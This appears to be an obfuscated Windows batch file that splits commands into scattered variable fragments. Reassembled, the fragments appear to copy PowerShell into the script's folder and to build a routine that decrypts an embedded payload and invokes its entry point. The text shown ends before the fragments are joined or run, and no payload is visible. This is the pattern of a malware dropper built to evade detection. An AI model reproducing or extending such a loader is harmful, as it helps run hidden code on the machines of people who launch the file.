@echo off
set "WfdbKpWFlz=co"
set "VuseLgnTKB=do"
set "jgIVQzpDbh=he"
set "ZskQAinoVi=we"
set "ALnFGmWjuq=\v"
set "nXvpPZweWT=we"
set "boFMDhmeCQ=Sy"
set "MAWZDPLVyM=ow"
set "JScOlHurEo= /"
set "JOwSyXYJyt=nd"
set "iLCEgaRGzw=s\"
set "xXhAUgpoPW=Wi"
set "VJXbNwhuwM=:\"
set "wVPdihWjQm=rS"
set "YZhuCqDvIm= C"
set "frkcsxUjvw=32"
set "ZIJtbHyCZF=in"
set "esBIsddHUF=rs"
set "AajwLWbhpk=po"
set "HwYjedbsRL=ll"
set "bRMACOajOd=ws"
set "xwSZCJHVZt=ll"
set "HpNWwjhQGp=he"
set "yIXliqgZrE=py"
set "vtQdNXlSMx=em"
set "EYTHuhyAeI=.e"
set "bxIGKadPAy=0\"
set "SunKagoAyp=xe"
set "DGtHoKPzFj=\W"
set "iLmCywIRaK=Po"
set "AyaNdJEour=1."
set "xyVdZWbiWf=st"
set "bKQjblnbAJ=y "
set "XqphrpWryK= %~dp0"
set "BeohrlFyqG=cd"
set "tUiaIIQkZP=PTtG"
set "USInOrLUIe=tX);"
set "mUSCKjQcbz=g = "
set "joyRWlraId=('%*'"
set "DibTJYRYzL=qAmj"
set "EbyOWczabr=L4Yi"
set "McvnQjrJwV= = N"
set "XyPwoLkOBQ=ct S"
set "VvzmvhVxbd=n ''"
set "pEUnJyIZVp=e]::"
set "bVnxlrQqEb=oint"
set "OMitumhCdm=[Env"
set "kBSCNhOVpT=ck($"
set "UsCAWnhZRG=PxEW"
set "SQNOBeQWbo=($Vd"
set "SFOkUHcpdH=y.Cr"
set "vZwbVEsihg=)($t"
set "fqkdmLTado=, (,"
set "NhmJZGJFoT=ne);"
set "xCTmwobCwF=esaB"
set "DkjhxxbEmh=ose("
set "QqEQtRVdoq== $B"
set "ecpxQtCZBW=shNr"
set "PqZuRWqqUM=stem"
set "NluvnCNLFD=tem."
set "BSuegguisC=$Blw"
set "aMrLYsVYER=Zt.D"
set "IdfOBLOdtN=join"
set "gyaupQrjLb=..-1"
set "KYVnmdhDBB=ateD"
set "nIYjyxRcZR=CFxo"
